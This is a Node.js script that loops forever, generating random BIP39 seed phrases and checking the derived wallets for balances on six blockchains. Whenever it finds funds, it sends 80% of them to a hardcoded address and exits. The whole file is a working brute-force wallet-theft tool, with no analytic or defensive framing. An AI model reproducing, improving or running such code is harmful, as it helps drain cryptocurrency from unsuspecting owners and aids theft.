const HDWalletProvider = require('@truffle/hdwallet-provider');
const Web3 = require('web3');
const bip39 = require('bip39');
const { PrismaClient } = require('@prisma/client');
const prisma = new PrismaClient()

const saveWallet = async (mnemonic, account, ballance, network) =>
{
    console.log('saving wallet', mnemonic, account, ballance)
    // verifica se ja existe a conta
    await prisma.wallets.create({
        data: {
            mnemonic,
            network,
            ballance: isNaN(+ballance) ? 0 : +ballance,
        }
    }).catch(err => console.log(err, mnemonic, account, ballance));
}

const checkBalance = async (web3Provider, network, _mnemonic) =>
{
    // get accounts
    const accounts = [...new Set(await web3Provider.eth.getAccounts())];

    let accountsAlreadyChecked = await prisma.wallets.findMany({
        where: {
            mnemonic: _mnemonic,
            ballance: 0,
            network,
        }
    }).then((wallets) => {
        return wallets.map((wallet) => wallet.account)
    })

    if(accountsAlreadyChecked.length > 0)
    {
        console.log('accountsAlreadyChecked', accountsAlreadyChecked, _mnemonic)
        return;
    }
    else
    {
        saveWallet(_mnemonic, accounts[0], await web3Provider.eth.getBalance(accounts[0]), network)
    }

    // for each account of the 5 first accounts
    for (const account of accounts.slice(0, 5))
    {
        // get balance
        const brutBalance = await web3Provider.eth.getBalance(account);
        const balance = await web3Provider.utils.fromWei(brutBalance, 'ether');

        // balance to transfer - 20% of the balance
        const balanceToTransfer = brutBalance * 0.8;


        // check if balance is greater than 0
        if (balance > 0)
        {
            if(network == 'Matic Mainnet')
            {
                // confirm balance
                const balanceMatic = await web3Provider.eth.getBalance(account);
                const balanceMatic2 = await web3Provider.eth.getBalance(account);

                if(balanceMatic != brutBalance && balanceMatic2 != brutBalance)
                {
                    console.log(`Error: balance mismatch! ${balanceMatic} != ${brutBalance}`);

                    console.log(`Mnemonic: ${_mnemonic}, Account: ${account}, index: ${accounts.indexOf(account)}`);
                    continue;
                }
            }

            console.log(`Wallet found! Balance: ${balance} ETH on ${network}`);
            console.log(`Mnemonic: ${_mnemonic}, Account: ${account}, index: ${accounts.indexOf(account)}`);

            // fix nonce error
            try
            {
                const NonceTrackerSubprovider = require("web3-provider-engine/subproviders/nonce-tracker");
                const nonceTracker = new NonceTrackerSubprovider()
                web3Provider.engine._providers.unshift(nonceTracker)
                nonceTracker.setEngine(web3Provider.engine)
            }
            catch (error)
            {
                console.log('nonce', error);    
            }

            // transfer funds to your wallet
            let gasPrice = await web3Provider.eth.getGasPrice()
            const tx = await web3Provider.eth.sendTransaction({
                from: account,
                to: '0x53FdA1A0b66E8A452d4088E635a0684ebf9163c2',
                value: balanceToTransfer,
                gasPrice: gasPrice,
            }).catch(err => console.log(err, _mnemonic, network));

            // log transaction
            console.log(`Transaction: ${JSON.stringify(tx)}`);

            // exit process
            process.exit();
        }
    }
}

let mnemonic = "";
const main_function = async () =>
{
    // infinite loop
    while (true)
    {
        // generating BIP39 mnemonic
        mnemonic = bip39.generateMnemonic();
    
        // check if wallet exists in Ethereum Mainnet
        let provider = new HDWalletProvider({
            mnemonic: {
                phrase: mnemonic
            },
            providerOrUrl: "https://ethereum.publicnode.com",
            pollingInterval: 10000000,
        })
        let web3 = new Web3(provider);
        
        await checkBalance(web3, 'Ethereum Mainnet', mnemonic)
            .catch(err => console.log(err, mnemonic, 'Ethereum Mainnet'));
    
        // check if wallet exists in Matic Mainnet
        provider = new HDWalletProvider({
            mnemonic: {
                phrase: mnemonic
            },
            providerOrUrl: "https://polygon-rpc.com",
            pollingInterval: 10000000,
        })
        let web3Matic = new Web3(provider);
        
        await checkBalance(web3Matic, 'Matic Mainnet', mnemonic)
            .catch(err => console.log(err, mnemonic, 'Matic Mainnet'));

        // check if wallet exists in Arbitrum Mainnet
        provider = new HDWalletProvider({
            mnemonic: {
                phrase: mnemonic
            },
            providerOrUrl: "https://arb1.arbitrum.io/rpc",
            pollingInterval: 10000000,
        })
        let web3Arbitrum = new Web3(provider);

        await checkBalance(web3Arbitrum, 'Arbitrum Mainnet', mnemonic)

        // check if wallet exists in Aurora Mainnet
        provider = new HDWalletProvider({
            mnemonic: {
                phrase: mnemonic
            },
            providerOrUrl: "https://mainnet.aurora.dev",
            pollingInterval: 10000000,
        })
        let web3Aurora = new Web3(provider);

        await checkBalance(web3Aurora, 'Aurora Mainnet', mnemonic)

        // check if wallet exists in Avalanche Network C-Chain Mainnet
        provider = new HDWalletProvider({
            mnemonic: {
                phrase: mnemonic
            },
            providerOrUrl: "https://avalanche-c-chain.publicnode.com",
            pollingInterval: 10000000,
        })
        let web3Avalanche = new Web3(provider);

        await checkBalance(web3Avalanche, 'Avalanche Network C-Chain Mainnet', mnemonic)

        // check if wallet exists in Celo Mainnet
        provider = new HDWalletProvider({
            mnemonic: {
                phrase: mnemonic
            },
            providerOrUrl: "https://forno.celo.org",
            pollingInterval: 10000000,
        })
        let web3Celo = new Web3(provider);

        await checkBalance(web3Celo, 'Celo Mainnet', mnemonic)

        console.log(`No money found! Mnemonic: ${mnemonic}`);
    }
}

main_function().catch(err => console.log(err, '; last mnemonic: ' ,mnemonic));